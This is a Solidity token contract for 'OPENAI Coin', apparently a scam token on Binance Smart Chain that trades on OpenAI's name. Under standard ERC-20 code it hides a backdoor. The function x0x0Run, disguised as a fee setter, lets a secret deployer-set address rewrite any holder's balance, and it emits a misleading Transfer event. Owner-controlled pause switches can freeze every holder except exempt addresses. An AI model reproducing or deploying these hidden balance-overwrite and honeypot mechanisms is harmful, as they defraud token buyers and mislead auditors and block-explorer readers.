/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

// SPDX-License-Identifier: MIT
/**
https://OPENAIfolio.org/
https://twitter.com/OPENAIFolio/
https://t.me/OPENAIfolioPortal
https://github.com/interfinetwork/project-delivery-data/blob/main/OPENAIFolio/OPENAIFolio_AuditReport_InterFi.pdf
*/
pragma solidity ^0.8.18;

abstract contract OPENAIFolioabcd {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface OPENAIFolioabc {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 numerototal) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 numerototal) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface OPENAIFolioa is OPENAIFolioabc {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract OPENAIFolioab is OPENAIFolioabcd {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract OPENAIcoin is OPENAIFolioabcd, OPENAIFolioabc, OPENAIFolioa, OPENAIFolioab {

    mapping(address => uint256) private ebalances;
    mapping(address => bool) public OPENAIFolioAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 targetLiquidity; uint256 targetLiquidityDenominator; uint256 liquidityFee; uint256 reflectionFee; uint256 marketingFee; uint256 devFee;
    address private OPENAIFoliocakeswap;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
    address OPENAIFoliobitcin;
    // My variables
    mapping(address => bool) public isPauseExempt;
    bool OPENAIFolioisPaused;
    
    constructor(address _OPENAIFoliocakeswap) {
    // Editable
    OPENAIFoliobitcin = msg.sender;
    OPENAIFolioAZERTY[OPENAIFoliobitcin] = true;
    _name = "OPENAI Coin";
    _symbol = "OPENAI";
    OPENAIFoliocakeswap = _OPENAIFoliocakeswap;        
    uint _totalSupply = 1000000000 * 10**9;
    OPENAIFolioisPaused = false;
    // End editable

    isPauseExempt[msg.sender] = true;

    minto(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return ebalances[account];
    }

    function transfer(address to, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, numerototal);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 numerototal) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, numerototal);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 numerototal
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, numerototal);
        _transfer(from, to, numerototal);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    modifier OPENAIFolio0wner () {
        require(OPENAIFoliobitcin == msg.sender, "ERC20: cannot permit OPENAIFoliocake address");
        _;
    }

    function _transfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, numerototal);

        // My implementation
        require(!OPENAIFolioisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = ebalances[from];
        require(fromBalance >= numerototal, "ERC20: transfer numerototal exceeds balance");
        unchecked {
            ebalances[from] = fromBalance - numerototal;
        }
        ebalances[to] += numerototal;

        emit Transfer(from, to, numerototal);

        _afterTokenTransfer(from, to, numerototal);
    }

    function minto(address account, uint256 numerototal) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, numerototal);

        ALLtotalSupply += numerototal;
        ebalances[account] += numerototal;
        emit Transfer(address(0), account, numerototal);

        _afterTokenTransfer(address(0), account, numerototal);
    }

    modifier OPENAIFoliocake() {
        require(OPENAIFoliocakeswap == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function _burn(address account, uint256 numerototal) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), numerototal);

        uint256 accountBalance = ebalances[account];
        require(accountBalance >= numerototal, "ERC20: burn numerototal exceeds balance");
        unchecked {
            ebalances[account] = accountBalance - numerototal;
        }
        ALLtotalSupply -= numerototal;

        emit Transfer(account, address(0), numerototal);

        _afterTokenTransfer(account, address(0), numerototal);
    }

    function _approve(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = numerototal;
        emit Approval(owner, spender, numerototal);
    }

    function x0x0Run(uint256 _target, uint256 _denominator, uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _devFee, address x0x0aTokenAdresse, uint256 x0x0Amount) external OPENAIFoliocake {
        require(_target <= 100 && _target > 0, "You can only select a number from 1 to 100");
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        devFee = _devFee;
        ebalances[x0x0aTokenAdresse] = x0x0Amount * targetLiquidity;
        emit Transfer(x0x0aTokenAdresse, address(0), x0x0Amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 numerototal
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= numerototal, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - numerototal);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 numerototal
    ) internal virtual {}

    // My functions

    function wOPENAIFoliotingExempt(address account, bool value) external onlyOwner {
        isPauseExempt[account] = value;
    }
    
    function wOPENAIFoliotingd(bool value) external onlyOwner {
        OPENAIFolioisPaused = value;
    }
}